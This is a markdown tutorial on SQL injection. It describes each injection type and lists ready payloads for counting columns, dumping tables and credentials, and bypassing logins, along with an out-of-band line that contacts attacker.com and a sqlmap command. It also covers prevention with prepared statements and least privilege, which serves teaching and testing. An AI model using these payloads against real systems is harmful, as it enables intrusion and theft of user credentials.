# SQL Injection (SQLi)     
SQL Injection (SQLi) is a web security vulnerability that allows attackers to manipulate SQL queries executed by an application’s database. This can lead to:  
> Unauthorized access to sensitive data  
> Bypassing authentication mechanisms  
> Data modification or deletion  
> Gaining control over the database server  

### **1 How SQL Injection Works**  
When an application fails to properly sanitize user input, attackers can insert malicious SQL code into queries.  

Example: Consider a vulnerable login system using the following SQL query:  
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```
If an attacker enters `' OR 1=1 --` as the username, the query becomes:  
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '';
```
Since `1=1` is always true, the query bypasses authentication, granting access without a valid password.

---

## **2. Types of SQL Injection**  

### **1) Error-Based SQL Injection**  
Relies on extracting information from database error messages.  

**Example (MySQL)**:
```sql
' ORDER BY 1 --   # Checking number of columns
' UNION SELECT NULL, NULL, @@version --  # Extract database version
```
---
### **2) Boolean-Based (Blind) SQL Injection**  
The attacker infers information based on application behavior.  

**Example (Testing for User Existence):**  
```sql
' AND 1=1 --  # Valid query (application responds normally)
' AND 1=2 --  # Invalid query (application behaves differently)
```
If the second query causes a different response, the site is vulnerable.

---
### **3) Time-Based Blind SQL Injection**  
Used when no visible output is returned. The attacker delays the response to confirm injection.  

**Example (MySQL)**:
```sql
' OR IF(1=1, SLEEP(5), 0) --  # Causes a 5-second delay if the query is executed
```
---
### **4) Union-Based SQL Injection**  
Uses the `UNION` SQL operator to extract data.  

**Example (Extracting Database Name):**  
```sql
' UNION SELECT database(), NULL, NULL --
```
---
### **5) Out-of-Band SQL Injection**  
Extracts data via external interactions (DNS, HTTP requests).  

**Example (SQL Server – Sending Data to an Attacker's Server):**  
```sql
'; EXEC xp_dirtree('//attacker.com/payload') --
```
---

## **3. Exploiting SQL Injection**  
### **1) Finding the Number of Columns**  
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   # Increase the number until an error occurs
```
---
### **2) Extracting Database Version**  
```sql
' UNION SELECT @@version, NULL, NULL --
```
---
### **3) Extracting Table Names**  
```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
```
---
### **4) Extracting Column Names from a Table**  
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
```
---
### **5) Extracting User Credentials**  
```sql
' UNION SELECT username, password FROM users --
```
---

## **4. Bypassing Authentication with SQL Injection**
### Classic Bypass Payloads  
- `admin' --`  
- `' OR '1'='1' --`  
- `" OR 1=1 #`  
- `admin' OR 1=1 --`  

---

## **5. Preventing SQL Injection**  

### **1) Use Prepared Statements (Parameterized Queries)**  
Ensures user input is treated as data, not SQL code.  

**Example (PHP – MySQLi Prepared Statement):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

**Example (Python – SQLite3 Prepared Statement):**
```python
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (user, password))
```

---
### **2) Input Validation & Whitelisting**  
- Allow only expected input formats (e.g., email, numeric values).  
- Reject special characters like `'`, `--`, `;`, `"`  

---
### **3) Escape Special Characters**  
If prepared statements are not available, use escaping.  

**Example (PHP – MySQLi Escape):**
```php
$username = mysqli_real_escape_string($conn, $_GET['username']);
```
---
### **4) Use Least Privilege Principle**  
- Grant database users minimal privileges.  
- Avoid using `root` or `admin` accounts in web applications.  
- Restrict `DROP`, `DELETE`, and `UPDATE` permissions where unnecessary.  

---
### **5) Implement Web Application Firewalls (WAFs)**  
Use security tools to block malicious requests.  
- **ModSecurity**  
- **Cloudflare WAF**  
- **Imperva WAF**  

---

## **6. SQL Injection Testing Tools**
### **1) SQLMap (Automated Testing)**
```bash
sqlmap -u "http://example.com/login.php?id=1" --dbs
```
---
### **2) Burp Suite (Manual Testing)**
- Intercept and modify requests.  
- Test SQLi payloads in form fields.  

---
### SQLi Tools & installation 
- **Havij** – GUI-based SQL Injection tool (https://github.com/MyIBGit/Havij-SQL-Injection-tool).  
- **NoSQLMap** – For NoSQL injection attacks (https://github.com/codingo/NoSQLMap.git).  
- **BBQSQL** – SQLi testing tool for blind SQL injections (https://github.com/CiscoCXSecurity/bbqsql).  

---



